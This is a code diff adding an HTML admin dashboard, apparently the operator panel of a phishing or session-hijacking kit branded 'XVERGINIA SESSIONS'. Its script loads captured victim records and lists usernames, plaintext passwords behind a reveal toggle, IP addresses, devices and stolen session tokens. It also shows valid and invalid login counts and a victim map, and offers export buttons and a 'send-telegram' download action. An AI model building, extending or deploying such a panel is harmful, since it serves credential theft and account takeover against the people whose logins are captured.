@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Admin Dashboard</title>
+    <meta charset="utf-8">
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css" />
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/remixicon/fonts/remixicon.css">
+    <link rel="stylesheet" href="css/main.css">
+	<link data-rh="true" rel="icon" href="/img/cookie.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+	<!-- jQuery + DataTables -->
+	<link rel="stylesheet" href="https://cdn.datatables.net/1.13.6/css/jquery.dataTables.min.css">
+	<script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
+	<script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-..." crossorigin="anonymous" referrerpolicy="no-referrer" />
+	<!-- Leaflet CSS -->
+	<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+	<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster/dist/MarkerCluster.css" />
+	<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster/dist/MarkerCluster.Default.css" />
+
+<style>
+.dashboard-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: 20px;
+  margin-top: 20px;
+}
+.stat-card {
+  background-color: #0e0e0e;
+  border: 1px solid #ffffff;
+  border-radius: 10px;
+  padding: 20px;
+  text-align: center;
+  color: #fff;
+  transition: transform 0.2s ease, box-shadow 0.2s ease;
+}
+.stat-card:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 4px 12px rgba(0, 188, 212, 0.2);
+}
+.stat-card h3 {
+  font-size: 0.9rem;
+  color: #b0b0b0;
+  margin-bottom: 10px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 6px;
+}
+.stat-card .value {
+  font-size: 2rem;
+  font-weight: bold;
+  color: #00bcd4;
+  margin: 5px 0;
+}
+.stat-card .description {
+  font-size: 0.85rem;
+  color: #8f8f8f;
+}
+.percent-up .value { color: #00e676; }
+.percent-down .value { color: #ff5252; }
+.dashboard-layout {
+  max-width: 1200px;
+  margin: 0 auto;
+  display: flex;
+  flex-direction: column;
+  gap: 30px;
+  padding: 20px;
+}
+.card-map {
+  background: #fff;
+  border-radius: 10px;
+  overflow: hidden;
+  height: 400px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+#map {
+  width: 100%;
+  height: 100%;
+}
+.session-section {
+  background: #fff;
+  border-radius: 10px;
+  padding: 20px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+.card-actions {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 10px;
+  margin-bottom: 20px;
+}
+.card-actions button {
+  padding: 8px 16px;
+  font-size: 14px;
+  background-color: #007bff;
+  color: white;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  transition: background 0.3s;
+}
+.card-actions button:hover { background-color: #0056b3; }
+.logs-table-container { overflow-x: auto; }
+.styled-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 14px;
+}
+.styled-table th, .styled-table td {
+  padding: 12px 15px;
+  border: 1px solid #ddd;
+  text-align: center;
+}
+.styled-table th { background-color: #f4f4f4; }
+.download-button {
+  padding: 6px 12px;
+  font-size: 13px;
+  border-radius: 5px;
+  border: 1px solid #007bff;
+  background-color: #e7f1ff;
+  color: #007bff;
+  cursor: pointer;
+}
+.download-button:hover { background-color: #d0e6ff; }
+.overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.5);
+  display: flex;
+  justify-content: center;
+  align-items: start;
+  padding: 30px 20px;
+  overflow-y: auto;
+  z-index: 9999;
+}
+.overlay-content {
+  background: white;
+  padding: 24px;
+  border-radius: 10px;
+  width: 100%;
+  max-width: 600px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+}
+.settings-title {
+  font-size: 24px;
+  font-weight: bold;
+  margin-bottom: 20px;
+  text-align: center;
+}
+.settings-section { margin-bottom: 30px; }
+.settings-section h3 { font-size: 18px; margin-bottom: 12px; }
+.form-row {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 10px;
+  margin-bottom: 15px;
+}
+.form-row input, .form-row select {
+  flex: 1;
+  min-width: 120px;
+  padding: 10px 12px;
+  font-size: 14px;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  background-color: #f9f9f9;
+  transition: 0.3s;
+}
+.form-row input:focus, .form-row select:focus {
+  border-color: #007bff;
+  background-color: white;
+  outline: none;
+}
+.btn-save {
+  width: 100%;
+  padding: 12px;
+  background-color: #00b894;
+  color: white;
+  font-weight: 600;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  font-size: 15px;
+  transition: background-color 0.3s;
+}
+.btn-save:hover { background-color: #019875; }
+
+.hidden { display: none; }
+.toggle-password {
+  margin-left: 8px;
+  border: none;
+  background: none;
+  cursor: pointer;
+  font-size: 14px;
+}
+</style>
+	<!-- Leaflet JS -->
+	<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+	<script src="https://unpkg.com/leaflet.markercluster/dist/leaflet.markercluster.js"></script>
+	<script src="js/leaflet-curve.js"></script> 
+	<script src="js/leaflet-heat.js"></script>   
+</head>
+<body> 
+	<nav class="navbar">
+		<div class="navbar-left">
+			<img src="/img/cookie.png" alt="Logo" class="navbar-logo" />
+			<span class="navbar-title">𝗫𝗩𝗘𝗥𝗚𝗜𝗡𝗜𝗔 SESSIONS 𝗗𝗔𝗦𝗛𝗕𝗢𝗔𝗥𝗗</span>
+		</div>
+		<div class="navbar-right">
+			<button id="settingsToggle">
+			<i class="ri-settings-3-line"></i>
+			<span>Settings</span>
+			</button>
+			<button id="themeToggle" title="Toggle Theme">
+			<i id="themeIcon" class="ri-moon-line"></i>
+			</button>
+			<button onclick="logoutUser()" title="Logout">
+			<i class="ri-logout-box-line"></i>
+			</button>
+		</div>
+</nav>
+
+<div class="dashboard-grid">
+  <div class="stat-card percent-bull">
+    <h3><i class="bi bi-people"></i> TOTAL VISITS</h3>
+    <p class="value total-visits">0</p>
+    <div class="trend">
+      <img src="img/dash-bull.svg" alt="bull">
+      <small class="percent">100%</small>
+    </div>
+    <p class="description">All Visitors</p>
+  </div>
+  <div class="stat-card percent-bull">
+    <h3><i class="bi bi-shield-check"></i> VALID LOGINS</h3>
+    <p class="value valid">0</p>
+    <div class="trend">
+      <img src="img/dash-bull.svg" alt="bull">
+      <small class="percent">100%</small>
+    </div>
+    <p class="description">Valid credentials</p>
+  </div>
+  <div class="stat-card percent-bear">
+    <h3><i class="bi bi-shield-x"></i> INVALID LOGINS</h3>
+    <p class="value invalid">0</p>
+    <div class="trend">
+      <img src="img/dash-bear.svg" alt="bear">
+      <small class="percent">0%</small>
+    </div>
+    <p class="description">Invalid credentials</p>
+  </div>
+</div>
+<div class="dashboard-layout">
+  <!-- Map Section -->
+  <div class="dashboard-card card-map">
+    <div id="map"></div>
+  </div>
+
+  <!-- Session Logs Section -->
+  <section class="session-section">
+    <div class="card-actions">
+      <button onclick="deleteAllSessions()">
+        <i class="ri-delete-bin-6-line"></i> Delete All
+      </button>
+      <button onclick="exportData('json')">
+        <i class="ri-download-2-line"></i> Export .JSON
+      </button>
+      <button onclick="exportData('csv')">
+        <i class="ri-download-2-line"></i> Export .CSV
+      </button>
+      <button onclick="exportData('txt')">
+        <i class="ri-download-2-line"></i> Export .TXT
+      </button>
+    </div>
+
+    <div class="logs-table-container">
+      <table id="dataTable" class="styled-table">
+        <thead>
+          <tr>
+            <th>No.</th>
+            <th>Username</th>
+            <th>Password</th>
+            <th>IP</th>
+            <th>Device</th>
+            <th>Time</th>
+            <th>Custom</th>
+            <th>Tokens</th>
+            <th></th>
+          </tr>
+        </thead>
+        <tbody id="sessionsTableBody">
+        </tbody>
+      </table>
+    </div>
+  </section>
+<div id="settingsOverlay" class="overlay hidden">
+  <div class="overlay-content">
+    <h2 class="settings-title">⚙️ Settings</h2>
+    <!-- Settings Form Removed for brevity in this Go port -->
+  </div>
+</div>
+</div>
+<div id="notify" class="notify hidden"></div>
+<script src="js/main.js"></script>
+
+<script>
+// Dynamic Session Render!
+fetch('/api/sessions').then(r=>r.json()).then(data => {
+   const tbody = document.getElementById('sessionsTableBody');
+   if(!data) { data = []; }
+   data.forEach((item, index) => {
+      let realPass = item.password || "";
+      let passHTML = '<span class="text-muted">No password</span>';
+      if (realPass) {
+          passHTML = `<span class="masked-password">••••••••</span>
+                      <span class="real-password hidden">${realPass}</span>
+                      <button type="button" class="toggle-password">👁️</button>`;
+      }
+
+      let ua = (item.useragent || "").toLowerCase();
+      let os = "Unknown OS", osIcon = "fa-question-circle";
+      let browser = "Unknown Browser", browserIcon = "fa-globe";
+
+      if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ios")) {
+        os = "iOS"; osIcon = "fa-mobile-screen-button";
+      } else if (ua.includes("android")) {
+         os = "Android"; osIcon = "fa-robot";
+      } else if (ua.includes("windows")) {
+         os = "Windows"; osIcon = "fa-desktop";
+      } else if (ua.includes("mac os") || ua.includes("macintosh")) {
+         os = "macOS"; osIcon = "fa-laptop";
+      } else if (ua.includes("linux")) {
+         os = "Linux"; osIcon = "fa-server";
+      }
+
+      if (ua.includes("chrome") && !ua.includes("edg")) {
+        browser = "Chrome"; browserIcon = "fa-chrome";
+      } else if (ua.includes("firefox")) {
+        browser = "Firefox"; browserIcon = "fa-firefox";
+      } else if (ua.includes("safari") && !ua.includes("chrome")) {
+        browser = "Safari"; browserIcon = "fa-safari";
+      } else if (ua.includes("edg")) {
+        browser = "Edge"; browserIcon = "fa-edge";
+      } else if (ua.includes("opera") || ua.includes("opr")) {
+        browser = "Opera"; browserIcon = "fa-opera";
+      }
+
+      const hasCustom = item.custom && Object.keys(item.custom).length > 0 ? "✅" : "";
+      const hasTokens = item.tokens && Object.keys(item.tokens).length > 0 ? '<i class="fa-solid fa-cookie-bite icon-cookie-valid"></i>' : '<i class="fa-solid fa-cookie icon-cookie-invalid"></i>';
+      const timeStr = new Date(item.create_time * 1000).toLocaleString();
+
+      const tr = document.createElement("tr");
+      tr.setAttribute("data-tokens", JSON.stringify(item.tokens || {}));
+      tr.setAttribute("data-custom", JSON.stringify(item.custom || {}));
+      tr.innerHTML = `
+          <td>${index + 1}</td>
+          <td>${item.username || ""}</td>
+          <td>${passHTML}</td>
+          <td>${item.remote_addr || ""}</td>
+          <td>
+              <i class="fa-solid ${osIcon}"></i> ${os}<br>
+              <i class="fa-brands ${browserIcon}"></i> ${browser}
+          </td>
+          <td>${timeStr}</td>
+          <td>${hasCustom}</td>
+          <td>${hasTokens}</td>
+          <td><button class="download-button send-telegram">Download</button></td>
+      `;
+      tbody.appendChild(tr);
+  });
+
+  $('#dataTable').DataTable({
+      pageLength: 10,
+      lengthMenu: [5, 10, 25, 50, 100],
+      responsive: true
+  });
+  if(typeof initCopyButtons === 'function') initCopyButtons();
+  
+  document.querySelectorAll(".toggle-password").forEach(button => {
+    button.addEventListener("click", () => {
+      const cell = button.closest("td");
+      const maskedPassword = cell.querySelector(".masked-password");
+      const realPassword = cell.querySelector(".real-password");
+
+      maskedPassword.classList.toggle("hidden");
+      realPassword.classList.toggle("hidden");
+
+      button.textContent = realPassword.classList.contains("hidden") ? "👁️" : "🙈";
+    });
+  });
+});
+
+// Update fetch stat endpoint
+setInterval(() => {
+  fetch("/api/stats")
+    .then(r => r.json())
+    .then(stats => {
+      const ts = document.querySelector(".total-visits");
+      if (ts) ts.textContent = stats.total;
+      const vs = document.querySelector(".valid");
+      if (vs) vs.textContent = stats.validCount;
+      const is = document.querySelector(".invalid");
+      if (is) is.textContent = stats.invalidCount;
+    });
+}, 5000);
+</script>
+</body>
+</html>
